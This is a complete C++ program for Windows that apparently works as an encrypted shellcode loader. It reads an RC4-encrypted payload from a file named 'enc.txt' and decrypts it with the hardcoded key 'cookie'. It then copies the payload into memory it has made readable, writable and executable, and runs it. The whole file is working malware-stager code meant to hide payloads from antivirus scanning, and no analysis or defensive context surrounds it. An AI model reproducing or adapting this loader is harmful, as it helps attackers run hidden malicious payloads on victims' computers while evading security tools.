#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <cstring>

void RC4Decrypt(std::vector<char>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i)
        s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<char> LoadShellcodeFromFile(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return {};
    }

    return std::vector<char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

void LoadShellcode(const char* filename) {
    // Load encrypted shellcode from file
    std::vector<char> buffer = LoadShellcodeFromFile(filename);
    if (buffer.empty()) {
        std::cerr << "Failed to load shellcode from file." << std::endl;
        return;
    }

    // Decrypt the shellcode
    std::string key = "cookie"; // Match this key with the encryption key
    RC4Decrypt(buffer, key);

    // Debug: Display decrypted shellcode
    std::cout << "Decrypted shellcode (first 10 bytes): ";
    for (size_t i = 0; i < std::min<size_t>(10, buffer.size()); ++i)
        std::cout << std::hex << (unsigned char)buffer[i] << " ";
    std::cout << std::endl;

    // Allocate executable memory
    void* exec = VirtualAlloc(nullptr, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == nullptr) {
        std::cerr << "Failed to allocate executable memory. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "Executable memory allocated at: " << exec << std::endl;

    // Copy shellcode to allocated memory
    std::memcpy(exec, buffer.data(), buffer.size());

    // Execute the shellcode
    try {
        void (*func)() = (void(*)())exec;
        std::cout << "Executing shellcode..." << std::endl;
        func();
    }
    catch (...) {
        std::cerr << "Shellcode execution caused an exception!" << std::endl;
    }

    // Free allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);
    std::cout << "Executable memory released." << std::endl;
}

int main() {
    const char* filename = "enc.txt"; // Provide the correct path to the encrypted shellcode file
    LoadShellcode(filename);
    return 0;
}
